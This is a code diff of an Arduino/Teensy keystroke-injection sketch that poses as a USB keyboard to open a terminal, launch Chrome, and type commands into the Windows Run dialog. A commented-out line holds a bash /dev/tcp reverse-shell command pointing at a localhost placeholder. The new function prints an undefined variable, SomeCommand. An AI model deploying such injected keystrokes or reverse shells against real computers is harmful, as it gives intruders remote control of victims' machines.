@@ -9,13 +9,18 @@ void setup() {
   digitalWrite(led, HIGH);
 
   delay(1000);
+
   openTerminal();
+
+
   //openApp("google-chrome");
   //type("/bin/bash ");
   //type("exec 196<>/dev/tcp/127.0.0.1/5000; <&196 >&196 2>&196");
   //openApp("start chrome 'google.com' ");
 
   run("google-chrome");
+
+  // windowsRun("");
 
   delay(2000);
 }
@@ -66,24 +71,22 @@ void openTerminal() {
 }
 
 // windows
- void openCMD() {
 
-  Keyboard.set_modifier(MODIFIERKEY_GUI);
-  Keyboard.send_now();
-  Keyboard.set_modifier(MODIFIERKEY_GUI | KEY_R);
-  Keyboard.send_now();
-  Keyboard.set_modifier(0);
-  Keyboard.send_now();
-  delay(100);
-  Keyboard.print("cmd");
+void windowsRun() {
+  // Irongeek's PHUKD Library
+  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI); //Windows key
+  Keyboard.set_key1(KEY_R); // use r key
+  Keyboard.send_now(); // send strokes
+  Keyboard.set_modifier(0); //prep release of  control keys
+  Keyboard.set_key1(0); //have to do this to keep it from hitting key multiple times.
+  Keyboard.send_now(); //Send the key changes
+  delay(500);
+  Keyboard.print(SomeCommand);
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
   Keyboard.set_key1(0);
   Keyboard.send_now();
-  delay(200);
-
- }
-
+}
 
 // loop
 
@@ -94,4 +97,3 @@ void loop() {
   digitalWrite(led, LOW);
   delay(100);
 }
-
